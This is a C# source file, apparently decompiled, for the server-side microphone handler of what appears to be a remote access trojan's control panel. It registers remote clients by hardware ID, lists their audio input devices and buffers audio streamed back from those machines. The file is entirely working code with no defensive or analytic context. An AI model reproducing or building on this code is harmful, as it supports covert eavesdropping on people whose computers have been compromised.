using System;
using System.Windows.Forms;
using NAudio.Wave;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerMicrophone
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (text == "Recovery")
			{
				if (client.Tag == null)
				{
					client.Disconnect();
				}
				else
				{
					((FormMicrophone)client.Tag).Buffer((byte[])objects[2]);
				}
			}
			return;
		}
		FormMicrophone form = (FormMicrophone)Application.OpenForms["Microphone:" + (string)objects[2]];
		if (form == null)
		{
			client.Disconnect();
			return;
		}
		if (objects.Length > 3)
		{
			Console.WriteLine((string)objects[3]);
			form.client1 = client;
			form.Invoke((MethodInvoker)delegate
			{
				string[] array = ((string)objects[3]).Split(',');
				foreach (string item in array)
				{
					form.rjComboBox1.Items.Add(item);
				}
				form.rjComboBox1.SelectedIndex = 0;
				form.Text = "Microphone [" + (string)objects[2] + "]";
				form.groupBox1.Enabled = true;
			});
			client.Tag = form;
			client.Hwid = (string)objects[2];
			return;
		}
		form.client2 = client;
		form.Invoke((MethodInvoker)delegate
		{
			try
			{
				for (int j = 0; j < WaveIn.DeviceCount; j++)
				{
					form.rjComboBox2.Items.Add(WaveIn.GetCapabilities(j).ProductName);
				}
				form.rjComboBox2.SelectedIndex = 0;
			}
			catch
			{
			}
			form.Text = "Microphone [" + (string)objects[2] + "]";
			form.groupBox2.Enabled = true;
		});
		client.Tag = form;
		client.Hwid = (string)objects[2];
	}
}
